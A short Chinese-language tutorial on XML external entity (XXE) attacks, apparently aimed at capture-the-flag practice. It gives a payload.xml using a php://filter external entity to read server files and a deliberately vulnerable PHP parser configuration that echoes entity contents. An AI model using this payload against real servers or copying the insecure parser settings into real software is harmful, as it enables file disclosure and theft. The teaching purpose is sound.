
​					

## 													XML实体类攻击(XXE)

我们都知道XML脚本用于在web端与端间存储与传输数据,  并且其对DTD的引用分为外部实体类与内部实体类等.

一般地，对于XML脚本，我们有如下典型元素:

```xml-dtd
<?xml version="1.0" ?>
<!DOCTYPE root [
  <!ELEMENT root (user, password,email)>
<!ELEMENT user (#PCDATA)>
<!ELEMENT password (#PCDATA)>
<!ELEMENT email (#PCDATA)>
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../index.php">
<!ENTITY e "???">
]>
<root>
  <!--external entity-->
  <user>&xxe;</user>
  <password>mypass&quot;</password>
  <!--enternal entity-->
  <email>&e;</email>
</root>
<!--payload.xml-->
```

由DOM的知识可知，我们使用PHP或者JAVASCIRPT脚本去将XML脚本解析为树形DOM, 其叶子节点即为元素中的值，并在浏览器或者终端回显出某些特定的值。

以上述脚本为例, 假如我们需要回显标签为email的元素, 我们可以在浏览器的控制台写出如下代码:

```javascript
if (window.XMLHttpRequest) {
  // code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp = new XMLHttpRequest();
} else {
  // code for IE6, IE5
  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.open("GET", "payload.xml", false);
xmlhttp.send();
xmlDoc = xmlhttp.responseXML;

//获取email 标签下的内部实体类
xmlDoc.getElementsByTagName("email")[0].childNodes[0].nodeValue;
// parse.js
```

其中, 以&xxe为例的外部实体类结合php伪协议, 我们可以泄露一些服务器内的文件.

但是我们惊喜地发现, javascript是无法解析php的外部实体类的.

所以在考虑文件泄露时, 我们只能利用后端代码, 如php, java等.

考虑服务器端代码:

```php
<?php
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

/*将xml格式的payload当作通过POST协议, 作为字符串传给xmlfile*/
$dom = new DOMDocument();
/*将xml字符串解析为数组*/
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
/*查看外部实体类, 泄露flag*/
var_dump($creds);
?>
```

其中, file_get_contents(“php://input”)语句用于将客户端POST参数直接打成字符串并回显.

很显然, 这是一个可以解析我们注入的XML并回显特定信息的代码段.

我们构造payload，在DTD特定的位置插入php://road/flat.txt, 查看回显即可.
